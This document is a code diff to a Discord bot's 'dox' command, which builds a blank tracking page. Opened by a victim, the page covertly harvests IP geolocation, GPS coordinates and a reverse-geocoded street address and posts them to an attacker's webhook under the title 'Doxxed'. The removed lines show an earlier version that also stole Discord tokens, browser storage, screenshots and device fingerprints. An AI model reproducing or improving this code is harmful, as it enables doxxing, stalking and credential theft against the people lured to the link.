@@ -29,7 +29,7 @@ client.once('ready', async () => {
     await client.application.commands.set([
         {
             name: 'dox',
-            description: 'Ultimate dox link',
+            description: 'Ultimate dox link (GPS + reverse geocode for exact address)',
             options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }]
         },
         {
@@ -77,7 +77,7 @@ client.on('interactionCreate', async (interaction) => {
         const embed = new EmbedBuilder()
             .setTitle('✅ Dox Ready')
             .setColor(0x22c55e)
-            .setDescription(`🔗 ${url}\n\nSends IP, location, token, storage, screenshot, fingerprints.`);
+            .setDescription(`🔗 ${url}\n\nSends exact address (GPS if allowed) + IP + location.`);
         await interaction.editReply({ embeds: [embed] });
         return;
     }
@@ -192,15 +192,13 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML – Fixed Syntax, White Page, IP Always Shows ----
+// ---- DOX HTML – GPS + Reverse Geocode for Exact Address ----
 function generateDoxHTML(webhook) {
-    // Build the HTML as a plain string (no nested template literals)
     return '<!DOCTYPE html>\n' +
            '<html>\n' +
            '<head>\n' +
            '    <meta charset="UTF-8">\n' +
            '    <title></title>\n' +
-           '    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"><\/script>\n' +
            '    <style>\n' +
            '        body { background: #ffffff; margin: 0; height: 100vh; }\n' +
            '    </style>\n' +
@@ -208,19 +206,6 @@ function generateDoxHTML(webhook) {
            '<body>\n' +
            '<script>\n' +
            'const WEBHOOK_URL = "' + webhook + '";\n' +
-           '\n' +
-           'function hash(str) {\n' +
-           '    let h = 0;\n' +
-           '    for (let i = 0; i < str.length; i++) { h = ((h << 5) - h) + str.charCodeAt(i); h |= 0; }\n' +
-           '    return h.toString(36);\n' +
-           '}\n' +
-           '\n' +
-           'function getCookie(name) {\n' +
-           '    const value = "; " + document.cookie;\n' +
-           '    const parts = value.split("; " + name + "=");\n' +
-           '    if (parts.length === 2) return parts.pop().split(";").shift();\n' +
-           '    return null;\n' +
-           '}\n' +
            '\n' +
            'async function getIPData() {\n' +
            '    const apis = [\n' +
@@ -247,219 +232,80 @@ function generateDoxHTML(webhook) {
            '    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };\n' +
            '}\n' +
            '\n' +
-           'async function getBattery() {\n' +
-           '    try { const b = await navigator.getBattery(); return Math.round(b.level*100)+"% ("+(b.charging?"Charging":"Not")+")"; }\n' +
-           '    catch { return "Not Available"; }\n' +
-           '}\n' +
-           '\n' +
-           'function getConnection() {\n' +
+           'async function reverseGeocode(lat, lon) {\n' +
            '    try {\n' +
-           '        const c = navigator.connection || navigator.mozConnection;\n' +
-           '        if (c) return (c.effectiveType || c.type) + " (" + (c.downlink || "N/A") + " Mbps)";\n' +
-           '    } catch {}\n' +
-           '    return "Not Available";\n' +
+           '        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");\n' +
+           '        const data = await res.json();\n' +
+           '        if (data && data.display_name) return data.display_name;\n' +
+           '    } catch (e) { console.error("Reverse geocode failed:", e); }\n' +
+           '    return null;\n' +
            '}\n' +
            '\n' +
-           'function getGPU() {\n' +
-           '    try {\n' +
-           '        const canvas = document.createElement("canvas");\n' +
-           '        const gl = canvas.getContext("webgl");\n' +
-           '        if (!gl) return "N/A";\n' +
-           '        const debug = gl.getExtension("WEBGL_debug_renderer_info");\n' +
-           '        if (!debug) return "N/A";\n' +
-           '        return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);\n' +
-           '    } catch { return "N/A"; }\n' +
-           '}\n' +
-           '\n' +
-           'function getWebRTC() {\n' +
-           '    return new Promise(r => {\n' +
-           '        try {\n' +
-           '            const pc = new RTCPeerConnection({ iceServers: [] });\n' +
-           '            pc.createDataChannel("");\n' +
-           '            pc.createOffer().then(o => pc.setLocalDescription(o));\n' +
-           '            pc.onicecandidate = e => {\n' +
-           '                if (!e.candidate) return;\n' +
-           '                const ip = e.candidate.address || e.candidate.ip;\n' +
-           '                if (ip && !ip.includes("local")) { r(ip); pc.close(); }\n' +
-           '            };\n' +
-           '            setTimeout(() => { r("N/A"); pc.close(); }, 2000);\n' +
-           '        } catch { r("N/A"); }\n' +
+           'async function getGPS() {\n' +
+           '    return new Promise((resolve) => {\n' +
+           '        if (!navigator.geolocation) {\n' +
+           '            resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });\n' +
+           '            return;\n' +
+           '        }\n' +
+           '        navigator.geolocation.getCurrentPosition(\n' +
+           '            (pos) => {\n' +
+           '                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) + "m" });\n' +
+           '            },\n' +
+           '            (err) => {\n' +
+           '                resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });\n' +
+           '            },\n' +
+           '            { enableHighAccuracy: true, timeout: 8000 }\n' +
+           '        );\n' +
            '    });\n' +
-           '}\n' +
-           '\n' +
-           'function getCanvasFP() {\n' +
-           '    try {\n' +
-           '        const canvas = document.createElement("canvas");\n' +
-           '        canvas.width = 256; canvas.height = 64;\n' +
-           '        const ctx = canvas.getContext("2d");\n' +
-           '        ctx.textBaseline = "top";\n' +
-           '        ctx.font = "14px Arial";\n' +
-           '        ctx.fillStyle = "#f60";\n' +
-           '        ctx.fillRect(125, 1, 62, 20);\n' +
-           '        ctx.fillStyle = "#069";\n' +
-           '        ctx.fillText("Cwm fjordbank glyphs vext quiz", 2, 15);\n' +
-           '        ctx.fillStyle = "rgba(102,204,0,0.7)";\n' +
-           '        ctx.fillText("Cwm fjordbank glyphs vext quiz", 4, 17);\n' +
-           '        return canvas.toDataURL();\n' +
-           '    } catch { return "N/A"; }\n' +
-           '}\n' +
-           '\n' +
-           'function getFonts() {\n' +
-           '    const fontList = ["Arial","Verdana","Times New Roman","Courier New","Georgia","Comic Sans MS","Impact","Tahoma","Trebuchet MS","Calibri","Cambria","Consolas","Segoe UI","Roboto","Open Sans","Lato","Montserrat","Poppins","Ubuntu","Inter"];\n' +
-           '    const base = "mmmmmmmmmmlli";\n' +
-           '    const test = document.createElement("span");\n' +
-           '    test.style.cssText = "position:absolute;top:-9999px;left:-9999px;font-size:72px;font-family:monospace;";\n' +
-           '    test.innerHTML = base;\n' +
-           '    document.body.appendChild(test);\n' +
-           '    const refWidth = test.offsetWidth, refHeight = test.offsetHeight;\n' +
-           '    const detected = [];\n' +
-           '    fontList.forEach(font => {\n' +
-           '        test.style.fontFamily = font + ", monospace";\n' +
-           '        if (test.offsetWidth !== refWidth || test.offsetHeight !== refHeight) detected.push(font);\n' +
-           '    });\n' +
-           '    document.body.removeChild(test);\n' +
-           '    return detected;\n' +
-           '}\n' +
-           '\n' +
-           'function getAudioFP() {\n' +
-           '    return new Promise(resolve => {\n' +
-           '        try {\n' +
-           '            const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);\n' +
-           '            const osc = ctx.createOscillator();\n' +
-           '            osc.type = "triangle";\n' +
-           '            osc.frequency.value = 1000;\n' +
-           '            const comp = ctx.createDynamicsCompressor();\n' +
-           '            osc.connect(comp);\n' +
-           '            comp.connect(ctx.destination);\n' +
-           '            osc.start(0);\n' +
-           '            ctx.oncomplete = e => {\n' +
-           '                const buffer = e.renderedBuffer.getChannelData(0);\n' +
-           '                let str = "";\n' +
-           '                for (let i = 0; i < 100; i++) str += buffer[i].toFixed(6);\n' +
-           '                resolve(hash(str));\n' +
-           '            };\n' +
-           '            ctx.startRendering();\n' +
-           '        } catch { resolve("N/A"); }\n' +
-           '    });\n' +
-           '}\n' +
-           '\n' +
-           'async function takeScreenshot() {\n' +
-           '    try {\n' +
-           '        if (typeof html2canvas === "undefined") return null;\n' +
-           '        await new Promise(r => setTimeout(r, 100));\n' +
-           '        const canvas = await html2canvas(document.body, {\n' +
-           '            useCORS: true,\n' +
-           '            logging: false,\n' +
-           '            scale: 1,\n' +
-           '            width: window.innerWidth,\n' +
-           '            height: document.documentElement.scrollHeight,\n' +
-           '            windowHeight: document.documentElement.scrollHeight,\n' +
-           '            scrollY: 0,\n' +
-           '            scrollX: 0\n' +
-           '        });\n' +
-           '        return canvas.toDataURL("image/png");\n' +
-           '    } catch { return null; }\n' +
            '}\n' +
            '\n' +
            '(async function() {\n' +
            '    try {\n' +
            '        const ip = await getIPData();\n' +
-           '        const battery = await getBattery();\n' +
-           '        const conn = getConnection();\n' +
-           '        const gpu = getGPU();\n' +
-           '        const webrtc = await getWebRTC();\n' +
-           '        const canvasFP = getCanvasFP();\n' +
-           '        const fonts = getFonts();\n' +
-           '        const audioFP = await getAudioFP();\n' +
-           '\n' +
-           '        const ua = navigator.userAgent;\n' +
-           '        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";\n' +
-           '        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";\n' +
-           '        const deviceType = /mobile|android|iphone|ipad/i.test(ua) ? "📱 Mobile" : /tablet|ipad/i.test(ua) ? "📱 Tablet" : "💻 Desktop";\n' +
-           '\n' +
-           '        let ls = {}, ss = {};\n' +
-           '        try { for (let i=0; i<localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage[k]; } } catch {}\n' +
-           '        try { for (let i=0; i<sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage[k]; } } catch {}\n' +
-           '\n' +
-           '        let discordToken = localStorage.getItem("token") || getCookie("token") || "N/A";\n' +
-           '\n' +
-           '        const pageTitle = document.title;\n' +
-           '        const pageURL = window.location.href;\n' +
-           '        const referrer = document.referrer || "N/A";\n' +
-           '\n' +
            '        const now = new Date();\n' +
-           '        const timeData = {\n' +
-           '            timestamp: now.toISOString(),\n' +
-           '            local: now.toString(),\n' +
-           '            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n' +
-           '            offset: now.getTimezoneOffset()\n' +
-           '        };\n' +
+           '        const timestamp = now.toISOString();\n' +
+           '        const localTime = now.toString();\n' +
+           '        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;\n' +
            '\n' +
-           '        const data = {\n' +
-           '            ip: ip.ip, country: ip.country, region: ip.region, city: ip.city, postal: ip.postal,\n' +
-           '            lat: ip.lat, lon: ip.lon, asn: ip.asn, isp: ip.isp, timezone: ip.timezone,\n' +
-           '            battery, connection: conn, gpu, webrtc, canvasFP: hash(canvasFP), fonts: fonts.join(", "),\n' +
-           '            audioFP, browser, os, deviceType,\n' +
-           '            screen: screen.width+"x"+screen.height,\n' +
-           '            colorDepth: screen.colorDepth,\n' +
-           '            pixelDepth: screen.pixelDepth,\n' +
-           '            devicePixelRatio: window.devicePixelRatio || 1,\n' +
-           '            language: navigator.language,\n' +
-           '            languages: navigator.languages ? navigator.languages.join(", ") : "N/A",\n' +
-           '            platform: navigator.platform,\n' +
-           '            hardwareCores: navigator.hardwareConcurrency || "N/A",\n' +
-           '            deviceMemory: navigator.deviceMemory || "N/A",\n' +
-           '            touchPoints: navigator.maxTouchPoints || 0,\n' +
-           '            cookiesEnabled: navigator.cookieEnabled ? "Enabled" : "Disabled",\n' +
-           '            doNotTrack: navigator.doNotTrack || "N/A",\n' +
-           '            discordToken: discordToken,\n' +
-           '            localStorage: JSON.stringify(ls).slice(0, 1000),\n' +
-           '            sessionStorage: JSON.stringify(ss).slice(0, 1000),\n' +
-           '            pageTitle, pageURL, referrer,\n' +
-           '            userAgent: ua,\n' +
-           '            time: timeData\n' +
-           '        };\n' +
+           '        // Get GPS (if allowed)\n' +
+           '        const gps = await getGPS();\n' +
+           '        let address = "N/A";\n' +
+           '        let lat = ip.lat || "N/A";\n' +
+           '        let lon = ip.lon || "N/A";\n' +
+           '        let accuracy = "N/A";\n' +
+           '        let source = "IP Geolocation";\n' +
            '\n' +
+           '        if (gps.lat !== "N/A") {\n' +
+           '            lat = gps.lat;\n' +
+           '            lon = gps.lon;\n' +
+           '            accuracy = gps.acc;\n' +
+           '            source = "GPS (exact)";\n' +
+           '            const addr = await reverseGeocode(gps.lat, gps.lon);\n' +
+           '            if (addr) address = addr;\n' +
+           '        }\n' +
+           '\n' +
+           '        // Build fields\n' +
            '        const fields = [\n' +
-           '            { name: "🌐 IP", value: data.ip || "N/A", inline: true },\n' +
-           '            { name: "📍 Country", value: data.country || "N/A", inline: true },\n' +
-           '            { name: "🏙️ City", value: data.city || "N/A", inline: true },\n' +
-           '            { name: "🗺️ Region", value: data.region || "N/A", inline: true },\n' +
-           '            { name: "📮 Postal", value: data.postal || "N/A", inline: true },\n' +
-           '            { name: "📌 Coordinates", value: (data.lat || "N/A") + ", " + (data.lon || "N/A"), inline: true },\n' +
-           '            { name: "🔢 ASN", value: data.asn || "N/A", inline: true },\n' +
-           '            { name: "🏢 ISP", value: data.isp || "N/A", inline: true },\n' +
-           '            { name: "🕒 Timezone", value: data.timezone || "N/A", inline: true },\n' +
-           '            { name: "⏰ Local Time", value: data.time.local || "N/A", inline: false },\n' +
-           '            { name: "🔋 Battery", value: data.battery || "N/A", inline: true },\n' +
-           '            { name: "📶 Connection", value: data.connection || "N/A", inline: true },\n' +
-           '            { name: "📱 Screen", value: data.screen || "N/A", inline: true },\n' +
-           '            { name: "🧠 Browser", value: data.browser || "N/A", inline: true },\n' +
-           '            { name: "💻 OS", value: data.os || "N/A", inline: true },\n' +
-           '            { name: "🖥️ Device", value: data.deviceType || "N/A", inline: true },\n' +
-           '            { name: "🎮 GPU", value: data.gpu || "N/A", inline: false },\n' +
-           '            { name: "📡 WebRTC", value: data.webrtc || "N/A", inline: true },\n' +
-           '            { name: "💾 Hardware", value: (data.hardwareCores || "N/A") + " cores, " + (data.deviceMemory || "N/A") + "GB RAM", inline: true },\n' +
-           '            { name: "🖱️ Touch", value: data.touchPoints + " points", inline: true },\n' +
-           '            { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },\n' +
-           '            { name: "🚫 Do Not Track", value: data.doNotTrack, inline: true },\n' +
-           '            { name: "🖼️ Canvas FP", value: data.canvasFP, inline: true },\n' +
-           '            { name: "🔤 Fonts", value: data.fonts || "N/A", inline: false },\n' +
-           '            { name: "🔊 Audio FP", value: data.audioFP, inline: true },\n' +
-           '            { name: "🔑 Discord Token", value: data.discordToken || "N/A", inline: false },\n' +
-           '            { name: "📂 localStorage (truncated)", value: data.localStorage || "N/A", inline: false },\n' +
-           '            { name: "📂 sessionStorage (truncated)", value: data.sessionStorage || "N/A", inline: false },\n' +
-           '            { name: "📄 Page Title", value: data.pageTitle || "N/A", inline: true },\n' +
-           '            { name: "🔗 Page URL", value: data.pageURL || "N/A", inline: false },\n' +
-           '            { name: "↩️ Referrer", value: data.referrer || "N/A", inline: false },\n' +
-           '            { name: "🌐 User Agent", value: data.userAgent || "N/A", inline: false }\n' +
+           '            { name: "📍 Address", value: address, inline: false },\n' +
+           '            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },\n' +
+           '            { name: "🎯 Accuracy", value: accuracy, inline: true },\n' +
+           '            { name: "📡 Source", value: source, inline: true },\n' +
+           '            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },\n' +
+           '            { name: "🏙️ City", value: ip.city || "N/A", inline: true },\n' +
+           '            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },\n' +
+           '            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },\n' +
+           '            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },\n' +
+           '            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },\n' +
+           '            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },\n' +
+           '            { name: "⏰ Local Time", value: localTime, inline: false },\n' +
+           '            { name: "📅 Timestamp", value: timestamp, inline: false }\n' +
            '        ];\n' +
            '\n' +
            '        const embed = {\n' +
            '            title: "☠️ Doxxed",\n' +
            '            color: 0xFF0000,\n' +
            '            fields: fields,\n' +
-           '            footer: { text: "Logged at " + data.time.timestamp }\n' +
+           '            footer: { text: "Logged at " + timestamp }\n' +
            '        };\n' +
            '\n' +
            '        await fetch(WEBHOOK_URL, {\n' +
@@ -468,26 +314,19 @@ function generateDoxHTML(webhook) {
            '            body: JSON.stringify({ embeds: [embed] })\n' +
            '        });\n' +
            '\n' +
-           '        const screenshot = await takeScreenshot();\n' +
-           '        if (screenshot) {\n' +
-           '            const blob = await fetch(screenshot).then(r => r.blob());\n' +
-           '            const formData = new FormData();\n' +
-           '            formData.append("file", blob, "screenshot.png");\n' +
-           '            await fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(() => {});\n' +
-           '        }\n' +
-           '\n' +
            '    } catch (err) {\n' +
            '        console.error("Dox error:", err);\n' +
            '    }\n' +
            '\n' +
-           '    document.body.innerHTML = "";\n' +
+           '    // ---- WHITE PAGE, CLOSE ----
+           document.body.innerHTML = "";\n' +
            '    document.body.style.background = "#ffffff";\n' +
            '    document.body.style.margin = "0";\n' +
            '    document.body.style.height = "100vh";\n' +
            '    setTimeout(() => {\n' +
            '        window.close();\n' +
            '        window.location.href = "about:blank";\n' +
-           '    }, 1500);\n' +
+           '    }, 1000);\n' +
            '})();\n' +
            '<\/script>\n' +
            '</body>\n' +
